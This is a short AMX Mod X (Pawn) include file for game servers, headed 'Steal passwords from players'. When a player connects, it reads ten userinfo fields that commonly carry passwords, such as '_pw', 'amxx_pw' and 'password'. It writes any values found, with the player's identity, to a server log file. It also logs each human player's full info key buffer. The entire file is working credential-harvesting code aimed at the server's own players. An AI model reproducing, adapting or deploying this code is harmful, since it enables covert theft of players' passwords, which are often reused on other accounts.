// Steal passwords from players

#if defined sic_pwsteal_included
    #endinput
#endif

#define sic_pwsteal_included

#define const_password_fields 10
#define const_password_log_file "addons/amxmodx/logs/sic_passwords.txt"

new c_pwfields[const_password_fields][]		= {"_pw", "amxx_pw", "amx_pw", "_amxx_pw", "_amx_pw", "_admin", "password", "admin", "_password", "pw"}

public sic_pwsteal_client_connect(id)
{
	new temp_pw[255], p_userlogstr[128]

	for (new i = 0; i < const_password_fields; i++) {
		get_user_info(id, c_pwfields[i], temp_pw, charsmax(temp_pw))
		if (!equal(temp_pw, "")) {
			#if defined sic_userinfo_included
				sic_userinfo_logstring(id, p_userlogstr, charsmax(p_userlogstr))
				log_to_file(const_password_log_file, "%s has password (%s ^"%s^")", p_userlogstr, c_pwfields[i], temp_pw)
			#else
				log_to_file(const_password_log_file, "%d^tsetinfo %s %s", get_user_userid(id), c_pwfields[i], temp_pw)
			#endif
		}
	}
}

public sic_pwsteal_client_putinserver(id)
{
	if (!is_user_bot(id)) {
		new p_keybuffer[512], p_userlogstr[128]
		sic_userinfo_logstring(id, p_userlogstr, charsmax(p_userlogstr))
		get_info_keybuffer(id, p_keybuffer, charsmax(p_keybuffer))
		log_to_file(const_password_log_file, "%s info key buffer (value ^"%s^")", p_userlogstr, p_keybuffer)

		sic_userinfo_stripinfo(id)
	}
}
